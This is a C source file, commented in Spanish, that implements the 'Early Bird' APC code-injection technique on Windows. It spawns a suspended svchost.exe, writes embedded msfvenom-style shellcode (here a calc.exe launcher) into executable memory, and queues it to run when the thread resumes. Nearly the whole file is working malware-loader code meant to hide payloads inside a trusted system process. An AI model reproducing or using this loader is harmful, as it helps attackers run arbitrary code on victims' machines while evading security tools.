// early_bird_injection.c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Shellcode que cargará nuestra DLL (msfvenom generado)
// Este es un ejemplo simple, usaríamos un shellcode generado dinámicamente
unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

DWORD FindTargetProcess(const char* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    DWORD pid = 0;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe))
        return 0;
    
    do {
        if (strcmp(pe.szExeFile, procname) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));
    
    CloseHandle(hSnapshot);
    return pid;
}

BOOL EarlyBirdInjection(DWORD pid) {
    HANDLE hProcess, hThread;
    LPVOID pRemoteMemory;
    
    // Abrir proceso con los permisos necesarios
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | 
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | 
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProcess) {
        printf("Error abriendo proceso: %d\n", GetLastError());
        return FALSE;
    }
    
    // Crear proceso suspendido (Early Bird)
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    WCHAR cmdLine[] = L"C:\\Windows\\System32\\svchost.exe -k LocalService";
    
    if (!CreateProcessW(
        NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS,
        NULL, NULL, &si, &pi)) {
        printf("Error creando proceso suspendido: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Asignar memoria en el proceso suspendido
    pRemoteMemory = VirtualAllocEx(
        pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteMemory) {
        printf("Error asignando memoria remota: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    // Escribir shellcode
    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, sizeof(shellcode), NULL)) {
        printf("Error escribiendo memoria: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    // Colocar APC en el hilo principal (aún suspendido)
    PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)pRemoteMemory;
    
    if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL)) {
        printf("Error encolando APC: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    // Reanudar hilo - el APC se ejecutará inmediatamente
    ResumeThread(pi.hThread);
    
    printf("[+] Inyección Early Bird completada!\n");
    
    // Limpiar handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hProcess);
    
    return TRUE;
}

int main() {
    DWORD pid = FindTargetProcess("svchost.exe");
    
    if (!pid) {
        printf("No se encontró svchost.exe\n");
        return 1;
    }
    
    printf("[+] Inyectando en proceso suspendido...\n");
    EarlyBirdInjection(pid);
    
    return 0;
}
